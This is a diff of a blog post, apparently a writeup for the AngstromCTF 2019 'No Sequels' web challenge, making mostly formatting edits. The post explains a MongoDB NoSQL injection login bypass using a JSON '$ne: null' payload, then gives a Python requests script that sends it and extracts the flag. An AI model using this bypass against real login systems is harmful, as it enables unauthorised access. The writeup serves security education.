@@ -1,10 +1,8 @@
 ---
 title: "Angstromctf 2019 | No Sequels and No Sequels2 Web Writeup"
 author: "CHERIEF Yassine (omega_coder)"
-type: ""
 date: 2019-04-26T01:49:01+02:00
 subtitle: "Mongodb Authentification bypass and Blind Injection"
-image: ""
 tags: ["ctf", "nosql", "mongodb", "nosql-injection", "web", "writeup"]
 categories: ["writeups", "security"]
 ---
@@ -15,7 +13,7 @@ This blog post contains the writeup for two challenges (No SEQUELS & No SEQUELS 
 So let's start with No SEQUELS first.
 
 **Category:** Web  
-*Points:* 50  
+**Points:** 50  
 
 -----------------------------
 
@@ -41,20 +39,20 @@ After reading the code, this is clearly a NoSQL Injection because of unsanitized
 
 The following two lines show that the variables username and password are not sanitized by anyway.
 
-```
+```js
 var user = req.body.username;
 var pass = req.body.password;
 ```
 
 One more thing to notice, the line below show that the body can be parser using json regarded that we supply some json input with `Content-Type: application/json`.
 
-```
+```js
 app.use(bodyParser.json());
 ```
 
 NoSQL databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional `SQL` syntax.
 
-The unsanitisation of username and password will lead to NoSQL code injection.
+The unsanitisation of username and password will lead to NoSQL code injection.  
 
 What would happen if we post the following JSON data:
 
@@ -67,9 +65,9 @@ Content-Type: application/json
 }
 ```
 
-By Sending this payload the username & password will be parsed as so, thus the query being
+By Sending this payload the username & password will be parsed as so, thus the query being  
 
-```
+```javascript
 var query = {
     username: {"$ne": null};
     password: {"$ne": null};
@@ -77,9 +75,9 @@ var query = {
     
 ```
 
-Now, executing the line below from the app source code will return the first row, and we will be authenticated.
+Now, executing the line below from the app source code will return the first row, and we will be authenticated.  
 
-```
+```javascript
 db.collection('users').findOne(query, function(err, user) {
     if (!user) {
         res.send("Wrong username or password");
@@ -88,12 +86,11 @@ db.collection('users').findOne(query, function(err, user) {
     res.cookie('token', jwt.sign({name: user.username, authnticated: true}, secret));
     res.redirect("/site");
 });
-
 ```
-
 Let's write a script to do the work for us, and get that first `FLAG`.
 
-We will be using python requests module.
+We will be using python requests module.  
+
 
 ```python
 import requests
@@ -117,15 +114,15 @@ if token_req.status_code == 200:
         # update token in cookies dict
         cookies["token"] = str(m.group(1))
 
-# Now let's send the json payload with the alongside the cookie we got above.
-# we will leave requests default behaviour to follow redirects which will redirect us to /site
+    # Now let's send the json payload alongside the cookie we got above.
+    # we will leave requests default behaviour to follow redirects which will redirect us to /site
 
-flag_re =  re.compile(r"actf{.*}")
+flag_re = re.compile(r"actf{.*}")
 
 # make request with mallicious payload
 
 req = session.post(URL, json=payload, cookies=cookies, verify=False)
-# verify is just for HTTPS connection
+# verify=False is just for HTTPS connection
 
 if req.status_code == 200:
     # FLAG match
@@ -134,7 +131,8 @@ if req.status_code == 200:
         print("1st FLAG: ", m.group(0)) 
 ```
 
-**`FLAG is: actf{no_sql_doesn’t_mean_no_vuln}`**
+**`FLAG is : actf{no_sql_doesn’t_mean_no_vuln}`**
+
 
 
 
